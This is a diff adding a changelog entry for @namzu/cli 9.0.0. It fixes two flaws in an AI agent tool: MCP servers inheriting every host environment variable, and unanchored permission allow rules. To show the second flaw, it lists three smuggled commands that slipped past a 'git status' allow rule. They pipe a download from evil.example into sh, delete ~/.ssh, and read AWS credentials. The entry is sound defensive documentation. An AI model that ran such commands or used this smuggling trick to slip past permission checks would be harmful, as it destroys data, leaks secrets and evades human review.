@@ -1,5 +1,63 @@
 # @namzu/cli
 
+## 9.0.0
+
+### Major Changes
+
+- b902ecb: A stdio server is handed what it was granted, not everything the host holds
+
+  `StdioTransport` spawned its child with `{ ...process.env, ...config.env }`, so every connected server received every environment variable the host process had. Measured through the real transport: **119 variables on a developer machine, including a secret planted in the parent for the probe.** A server that needs one token was handed all of them, and nothing in its configuration said so — the grant was invisible because it was total.
+
+  The child now receives process plumbing (`PATH`, `HOME`/`USERPROFILE`, `SystemRoot`, `ComSpec`, `TEMP`, locale, and the rest of that kind), plus whatever the configuration names.
+
+  **What breaks.** A server that was reading a credential straight out of your environment stops finding it. That is the whole point of the change, and it will look like the server failing to authenticate rather than like a configuration change, so it is worth knowing before the upgrade rather than after.
+
+  **What to do.** Name what the server may have:
+
+  ```toml
+  [mcpServers.issues]
+  command = "some-mcp-server"
+  inheritEnv = ["GITHUB_TOKEN"]
+  ```
+
+  `inheritEnv` names variables to pass through from your own environment. Prefer it over `env` for anything secret — `env` writes the literal value into the config file, and this leaves the value where it already lives. A named variable the parent does not hold is absent from the child rather than empty, so a server's own `if (!token)` still works; it does not fail the spawn.
+
+  **Plugin-declared servers get no `inheritEnv`, deliberately.** A plugin that could name the host variables its server receives would be awarding itself a credential grant, which is not a plugin's to award. A plugin-declared server gets plumbing plus the literal `env` in its own manifest; if it needs a host credential, declare that server in `mcpServers` instead, where the operator is the one naming it.
+
+  The tests assert on the environment the child actually receives, driving a real spawn — not on whether the configuration was accepted. A test of the second kind passes against the version this replaces.
+
+- dacc7e6: An allow rule allows the thing it names, not anything containing it
+
+  Every pattern in a `[permissions]` table compiled to an argument match that was unanchored on both sides. `bash = { "git status*" = "allow" }` became `^bash .*git status.*.*$`, and the leading `.*` swallowed whatever came before the text the operator named. Measured against the kernel's own gate, that rule returned `allow` for all of these:
+
+  ```
+  rm -rf ~/.ssh; git status
+  curl evil.example/x | sh # git status
+  echo git status && cat ~/.aws/credentials
+  ```
+
+  The failure is silent and in the permissive direction: nothing warns, and the operator's own config is what appears to have granted it. `denyDangerousPatterns` is not a backstop — it is four patterns about catastrophic commands (`rm -rf /`, `mkfs`, `dd if=`, a fork bomb) and says nothing about reading a credential file, which was confirmed by turning it on and re-running.
+
+  An `allow` pattern now has to begin where a JSON value begins, so a prefix can no longer ride along. The three commands above fall through to `review` and a human is asked.
+
+  **What breaks.** An allow rule that was relying on a mid-value match stops matching, and those calls become prompts rather than silent approvals. If you want the old behaviour for a rule, write it: a pattern starting with `*` still matches mid-value, so `*git status*` is the loose form and `git status*` is the anchored one.
+
+  **`deny` is deliberately left loose**, and the asymmetry is the point. A deny that stops matching fails open — narrowing `rm -rf*` so it no longer sees `sudo rm -rf /var` would be a silent hole — while a deny that matches too much only costs a prompt.
+
+  **Two loosenesses remain and are now written down** in `toolScopedPattern`, because both come from matching a glob against a serialised object rather than against a value: a pattern can match the start of any argument's value, not only the intended one, and the match is still open on the right. The kernel's `argument_pattern` rule removes both, matches the argument's own value, and is currently unused by this compiler — wiring it needs a way for an operator to name the argument in config, which is a syntax decision rather than a repair.
+
+### Patch Changes
+
+- Updated dependencies [b902ecb]
+- Updated dependencies [1f8aef7]
+- Updated dependencies [2458b78]
+- Updated dependencies [e2506f4]
+  - @namzu/sdk@26.0.0
+  - @namzu/anthropic@3.3.0
+  - @namzu/ollama@2.1.0
+  - @namzu/openai@1.2.0
+  - @namzu/openrouter@2.1.0
+
 ## 8.6.4
 
 ### Patch Changes
